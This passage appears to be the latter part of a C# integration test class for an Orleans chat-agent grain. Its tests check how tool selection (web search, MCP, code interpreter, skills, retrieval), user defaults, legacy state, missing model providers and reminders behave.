        Assert.Contains("mcp_do_thing", registered);
    }

    // AC4b: an existing user with an EXPLICIT default tool list (saved before `mcp` existed) has no `mcp` in
    // it, so they get no MCP tools — the documented semi-breaking off-by-default for explicit tool-savers
    // (ADR 0021), reached here through the user-default layer, not a per-conversation override.
    [Fact]
    public async Task ExplicitToolsWithoutMcp_DropsMcpTools()
    {
        const string user = "mcp-explicit-default";
        await using var cluster = await NewClusterWithMcpToolsAsync(FakeMcpTool());
        await cluster.GrainFactory.GetGrain<IUserProfileGrain>(user)
            .SaveAsync(new UserProfile("", "system", [ToolCatalog.WebSearch])); // explicit, no mcp

        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>(user);
        var registered = ToolNames(Answer(await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.DefaultModel))));

        Assert.DoesNotContain("mcp_do_thing", registered);
        Assert.Contains("web_search", registered);
    }

    // AC2: a per-conversation override limits the registered tools to the selected key's tools (+ get_date).
    [Fact]
    public async Task Override_LimitsRegisteredTools()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("tools-override-conversation");
        await agent.SetEnabledToolsAsync([ToolCatalog.WebSearch]);

        var events = await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.DefaultModel));
        var answer = Answer(events);
        var registered = ToolNames(answer);

        Assert.Contains("web_search", registered);
        Assert.Contains("fetch_web_page", registered);
        Assert.Contains("get_date", registered);            // always-on, never filtered
        Assert.DoesNotContain("schedule_prompt", registered);
        Assert.DoesNotContain("get_current_location", registered);
        Assert.DoesNotContain("load_skill", answer);        // skills not selected → provider dropped
    }

    // AC3: disabling `skills` drops load_skill (the provider is a tool) but the document RAG provider is
    // NOT a tool, so retrieval still injects excerpts — the asymmetry the two providers are gated on.
    [Fact]
    public async Task SkillsDisabled_DropsLoadSkill_KeepsRetrieval()
    {
        const string key = "tools-skills-disabled-conversation";
        await SeedChunkAsync(key, new DocumentChunk("guide.pdf", 2, 0, "Magrathea is a legendary planet of untold wealth."));

        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        await agent.RegisterDocumentAsync("guide.pdf");
        // Everything EXCEPT skills.
        await agent.SetEnabledToolsAsync(
            [ToolCatalog.WebSearch, ToolCatalog.Location, ToolCatalog.Scheduling, ToolCatalog.CodeInterpreter]);

        var answer = Answer(await CollectAsync(
            agent.ChatAsync("what does the document say about magrathea", TestSiloConfigurator.DefaultModel)));

        Assert.DoesNotContain("load_skill", answer);
        Assert.Contains("web_search", ToolNames(answer));           // a non-skills tool still registers
        Assert.Contains("Magrathea is a legendary planet", answer); // RAG stayed on
    }

    // AC4: code_interpreter reaches the model ONLY when the model is hosted AND the tool is selected — on a
    // Chat model it is never built, and on a hosted model it is filtered out unless selected.
    [Fact]
    public async Task CodeInterpreter_OnlyOnHostedModelWhenSelected()
    {
        // Chat model, code_interpreter selected → still absent (the tool is never built off the hosted arm).
        var chat = _cluster.GrainFactory.GetGrain<IAgentGrain>("tools-ci-chat-conversation");
        await chat.SetEnabledToolsAsync([ToolCatalog.WebSearch, ToolCatalog.CodeInterpreter]);
        var chatRegistered = ToolNames(Answer(await CollectAsync(chat.ChatAsync("hi", TestSiloConfigurator.DefaultModel))));
        Assert.DoesNotContain("code_interpreter", chatRegistered);

        // Hosted model, code_interpreter NOT selected → filtered out.
        var hostedOff = _cluster.GrainFactory.GetGrain<IAgentGrain>("tools-ci-hosted-off-conversation");
        await hostedOff.SetEnabledToolsAsync([ToolCatalog.WebSearch]);
        var offRegistered = ToolNames(Answer(await CollectAsync(hostedOff.ChatAsync("hi", TestSiloConfigurator.HostedToolsModel))));
        Assert.Contains("web_search", offRegistered);
        Assert.DoesNotContain("code_interpreter", offRegistered);

        // Hosted model, code_interpreter selected → present.
        var hostedOn = _cluster.GrainFactory.GetGrain<IAgentGrain>("tools-ci-hosted-on-conversation");
        await hostedOn.SetEnabledToolsAsync([ToolCatalog.WebSearch, ToolCatalog.CodeInterpreter]);
        var onRegistered = ToolNames(Answer(await CollectAsync(hostedOn.ChatAsync("hi", TestSiloConfigurator.HostedToolsModel))));
        Assert.Contains("code_interpreter", onRegistered);
    }

    // AC5: capability is the outer gate — a selection on a no-tools model still registers NO tools.
    [Fact]
    public async Task SelectionOnNoToolModel_StillRegistersNoTools()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("tools-notool-selection-conversation");
        await agent.SetEnabledToolsAsync([ToolCatalog.WebSearch, ToolCatalog.Scheduling]);

        var answer = Answer(await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.NoToolsNoVisionModel)));

        Assert.Contains("[tools:]", answer);
        Assert.DoesNotContain("load_skill", answer);
    }

    // AC6: the user's default (from IUserProfileGrain, read on activation) applies to a chat with no override.
    // The grain key has no '/', so the userId IS the whole key — the profile grain shares it.
    [Fact]
    public async Task UserDefault_AppliesWhenNoOverride()
    {
        const string user = "tools-userdefault";
        await _cluster.GrainFactory.GetGrain<IUserProfileGrain>(user)
            .SaveAsync(new UserProfile("", "system", [ToolCatalog.WebSearch]));

        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(user);
        var answer = Answer(await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.DefaultModel)));
        var registered = ToolNames(answer);

        Assert.Contains("web_search", registered);
        Assert.DoesNotContain("schedule_prompt", registered);
        Assert.DoesNotContain("get_current_location", registered);
        Assert.DoesNotContain("load_skill", answer);
    }

    // AC7: a per-conversation override beats the user default.
    [Fact]
    public async Task Override_BeatsUserDefault()
    {
        const string user = "tools-override-beats-default";
        await _cluster.GrainFactory.GetGrain<IUserProfileGrain>(user)
            .SaveAsync(new UserProfile("", "system", [ToolCatalog.WebSearch]));

        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(user);
        await agent.SetEnabledToolsAsync([ToolCatalog.Scheduling]);

        var registered = ToolNames(Answer(await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.DefaultModel))));

        Assert.Contains("schedule_prompt", registered);
        Assert.DoesNotContain("web_search", registered);   // the default was overridden
    }

    // AC8: SetEnabledToolsAsync persists — the selection survives a grain deactivation, and
    // GetEnabledToolsAsync reports the effective set.
    [Fact]
    public async Task SetEnabledTools_PersistsAcrossDeactivation()
    {
        const string key = "tools-persist-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        await agent.SetEnabledToolsAsync([ToolCatalog.WebSearch]);

        await agent.AsReference<IGrainManagementExtension>().DeactivateOnIdle();
        var reactivated = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        Assert.Equal(new[] { ToolCatalog.WebSearch }, await reactivated.GetEnabledToolsAsync());

        var registered = ToolNames(Answer(await CollectAsync(reactivated.ChatAsync("hi", TestSiloConfigurator.DefaultModel))));
        Assert.Contains("web_search", registered);
        Assert.DoesNotContain("schedule_prompt", registered);
    }

    // AC9: binding an agent snapshots its tools into the conversation (a null-tools agent pins all-selectable).
    [Fact]
    public async Task BindAgent_SnapshotsEnabledTools()
    {
        // Agent with an explicit tool set.
        var scoped = _cluster.GrainFactory.GetGrain<IAgentGrain>("tools-bind-scoped-conversation");
        await scoped.BindAgentAsync(new AgentBinding(
            "agent-tools", "Scheduler", "You schedule.", TestSiloConfigurator.DefaultModel, [ToolCatalog.Scheduling]));

        var scopedAnswer = Answer(await CollectAsync(scoped.ChatAsync("hi", null)));
        Assert.Contains("schedule_prompt", ToolNames(scopedAnswer));
        Assert.DoesNotContain("web_search", ToolNames(scopedAnswer));
        Assert.DoesNotContain("load_skill", scopedAnswer);
        Assert.Equal(new[] { ToolCatalog.Scheduling }, await scoped.GetEnabledToolsAsync());

        // A null-tools agent materializes to ALL selectable tools on bind — never inherits the user default.
        var full = _cluster.GrainFactory.GetGrain<IAgentGrain>("tools-bind-all-conversation");
        await full.BindAgentAsync(new AgentBinding(
            "agent-full", "Full", "You do everything.", TestSiloConfigurator.DefaultModel, null));
        Assert.Equal(ToolCatalog.AllSelectableToolKeys, await full.GetEnabledToolsAsync());
    }

    // AC10: old-shape state (EnabledTools absent) deserializes to null, which resolves to ALL tools — the
    // no-migration promise. A never-set conversation persists null and, after reactivation, still gets all.
    [Fact]
    public async Task LegacyState_NullEnabledTools_MeansAll()
    {
        const string key = "tools-legacy-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        // A first turn persists the session with EnabledTools still null (the old shape).
        await CollectAsync(agent.ChatAsync("hi", TestSiloConfigurator.DefaultModel));
        Assert.Equal(ToolCatalog.AllSelectableToolKeys, await agent.GetEnabledToolsAsync());

        // Reactivate: the persisted null deserializes to null → all tools on.
        await agent.AsReference<IGrainManagementExtension>().DeactivateOnIdle();
        var reactivated = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        var answer = Answer(await CollectAsync(reactivated.ChatAsync("again", TestSiloConfigurator.DefaultModel)));
        var registered = ToolNames(answer);

        foreach (var tool in new[]
        {
            "schedule_prompt", "get_date", "web_search", "fetch_web_page", "get_current_location",
        })
        {
            Assert.Contains(tool, registered);
        }

        Assert.Contains("load_skill", answer);   // skills provider (all-on) contributes it
    }

    // AC12: a conversation persisted with a bare, unqualified model id — every conversation that
    // existed before ADR 0013 — still opens and chats. This is the no-migration promise.
    [Fact]
    public async Task LegacyPersistedModel_StillResolves()
    {
        const string key = "legacy-model-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        // "gpt-4o" carries no provider prefix, exactly like the state written before this change.
        await foreach (var _ in agent.ChatAsync("hi", "gpt-4o"))
        {
        }

        Assert.Equal("gpt-4o", await agent.GetSelectedModelAsync());

        // Reopen it: activation resolves the legacy id from persisted state and the chat still works.
        await agent.Cast<IGrainManagementExtension>().DeactivateOnIdle();
        var reactivated = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        var events = await CollectAsync(reactivated.ChatAsync("still there?", null));
        Assert.Equal(AgentStreamEventType.Done, events[^1].Type);
    }

    // ---- No chat provider configured (ADR 0019) --------------------------------------------------
    //
    // These run on NoModelSiloConfigurator, whose switchable factory provider starts with NO chat
    // provider configured. The grain must stay valid via the no-op NoModelChatClient — build, history and
    // reminder never NRE — and only the two model-running sites act on the no-model signal.

    // AC5: a grain with no model configured yields a one-line notice + Done and does not crash; querying
    // its history returns (no NRE) — the whole point of the no-op-client design.
    [Fact]
    public async Task NoModel_YieldsNotice_AndHistoryDoesNotThrow()
    {
        await using var cluster = await NewClusterAsync<NoModelSiloConfigurator>(1);
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>("no-model-conversation");

        // The grain activates against the no-op client (HasModel is false): history must not throw.
        Assert.Empty(await agent.GetHistoryAsync());

        var events = await CollectAsync(agent.ChatAsync("hi", null));

        // A one-line notice + Done. The no-op client was never run (it throws if it is).
        Assert.Contains("No model provider is configured", Answer(events));
        Assert.Equal(AgentStreamEventType.Done, events[^1].Type);

        // The notice is ephemeral — nothing was persisted, so history stays empty.
        Assert.Empty(await agent.GetHistoryAsync());
    }

    // AC6: a user who adds their first provider on an ALREADY-activated grain can chat in that same
    // activation — ChatCoreAsync re-resolves the factory, rebinds onto the new model, and replies. The
    // factory-provider double flips empty→non-empty between the activation and the chat call.
    [Fact]
    public async Task NoModelThenProviderAdded_ReResolvesAndReplies()
    {
        await using var cluster = await NewClusterAsync<NoModelSiloConfigurator>(1);
        var provider = cluster.GetSiloServiceProvider(cluster.Primary.SiloAddress)
            .GetRequiredService<SwitchableChatClientFactoryProvider>();
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>("no-model-then-added-conversation");

        // Activate the grain while no provider is configured, so the empty factory is captured and
        // _modelId is "".
        Assert.Empty(await agent.GetHistoryAsync());

        // The user adds their first provider — on this SAME already-activated grain.
        provider.HasModel = true;

        var events = await CollectAsync(agent.ChatAsync("hi", null));

        var answer = Answer(events);
        Assert.False(string.IsNullOrWhiteSpace(answer));
        Assert.DoesNotContain("No model provider is configured", answer);
        Assert.Equal(AgentStreamEventType.Done, events[^1].Type);

        // The turn was persisted normally after the rebind.
        var history = await agent.GetHistoryAsync();
        Assert.Contains(history, t => t.Role == "user" && t.Text == "hi");
        Assert.Contains(history, t => t.Role == "assistant" && !string.IsNullOrWhiteSpace(t.Text));
    }

    // AC7: rebinding onto a regained model preserves existing history. A conversation builds history on a
    // model, loses every provider (reactivates empty, holding the persisted session), then regains one —
    // the snapshot→rebuild→restore rebind must keep the earlier turns.
    [Fact]
    public async Task RebindAfterRegainingModel_PreservesHistory()
    {
        await using var cluster = await NewClusterAsync<NoModelSiloConfigurator>(1);
        var provider = cluster.GetSiloServiceProvider(cluster.Primary.SiloAddress)
            .GetRequiredService<SwitchableChatClientFactoryProvider>();
        const string key = "regain-model-conversation";

        // Start WITH a model and build some history.
        provider.HasModel = true;
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        await CollectAsync(agent.ChatAsync("hi", null));

        // The user removes every provider; force a reactivation so the grain comes up with no model,
        // holding the persisted session.
        provider.HasModel = false;
        await agent.AsReference<IGrainManagementExtension>().DeactivateOnIdle();
        agent = cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        // History survives activation against the no-op client — no loss, no NRE.
        Assert.Contains(await agent.GetHistoryAsync(), t => t.Role == "user" && t.Text == "hi");

        // The user re-adds a provider and chats again: the rebind snapshots→rebuilds→restores, so the
        // earlier history is preserved alongside the new turn.
        provider.HasModel = true;
        await CollectAsync(agent.ChatAsync("still there?", null));

        var history = await agent.GetHistoryAsync();
        Assert.Contains(history, t => t.Role == "user" && t.Text == "hi");
        Assert.Contains(history, t => t.Role == "user" && t.Text == "still there?");
        Assert.True(history.Count(t => t.Role == "assistant" && !string.IsNullOrWhiteSpace(t.Text)) >= 2);
    }

    // AC5-adjacent (ADR 0019): a reminder that fires while no model is configured is SKIPPED — the
    // ReceiveReminder guard re-resolves, finds none, and returns without running the no-op client (no new
    // turn, TimesFired unchanged). Once a provider is added, the same reminder rebinds and runs.
    [Fact]
    public async Task ReceiveReminder_NoModel_SkipsUntilProviderAdded()
    {
        await using var cluster = await NewClusterAsync<NoModelSiloConfigurator>(1);
        var provider = cluster.GetSiloServiceProvider(cluster.Primary.SiloAddress)
            .GetRequiredService<SwitchableChatClientFactoryProvider>();
        const string key = "reminder-no-model-conversation";

        // With a model, schedule a real durable reminder.
        provider.HasModel = true;
        var agent = cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        await CollectAsync(agent.ChatAsync("please remind me to drink water", null));
        Assert.Single(await agent.GetScheduledPromptsAsync());

        // Lose every provider; reactivate with no model, holding the persisted session + reminder.
        provider.HasModel = false;
        await agent.AsReference<IGrainManagementExtension>().DeactivateOnIdle();
        agent = cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        var historyBefore = (await agent.GetHistoryAsync()).Count;

        // The reminder fires with no model → skipped: no new turn, TimesFired stays 0.
        await agent.AsReference<IRemindable>().ReceiveReminder("drink-water", default);
        Assert.Equal(historyBefore, (await agent.GetHistoryAsync()).Count);
        Assert.Equal(0, (await agent.GetScheduledPromptsAsync()).Single().TimesFired);

        // Add a provider; the same reminder now rebinds and runs, appending its prompt turn.
        provider.HasModel = true;
        await agent.AsReference<IRemindable>().ReceiveReminder("drink-water", default);
        var history = await agent.GetHistoryAsync();
        Assert.Contains(history, t => t.Role == "user" && t.Text == "Tell the user to drink some water.");
        Assert.Equal(1, (await agent.GetScheduledPromptsAsync()).Single().TimesFired);
    }

    // Reads the grain's persisted state straight out of the memory storage provider the test silo
    // uses, so a test can assert on what was actually written (the session blob, the host allowlist)
    // rather than on what the grain says about itself. The storage provider lives in the *silo's*
    // container — TestCluster.ServiceProvider is the client's, which has no grain storage in it.
    private async Task<AgentGrainState> SessionStateOf(string grainKey)
    {
        var storage = _cluster.GetSiloServiceProvider(_cluster.Primary.SiloAddress)
            .GetRequiredKeyedService<IGrainStorage>(AgentGrain.StorageProviderName);

        var state = new GrainState<AgentGrainState>(new AgentGrainState());
        await storage.ReadStateAsync(
            "agent",
            _cluster.GrainFactory.GetGrain<IAgentGrain>(grainKey).GetGrainId(),
            state);

        return state.State;
    }
}
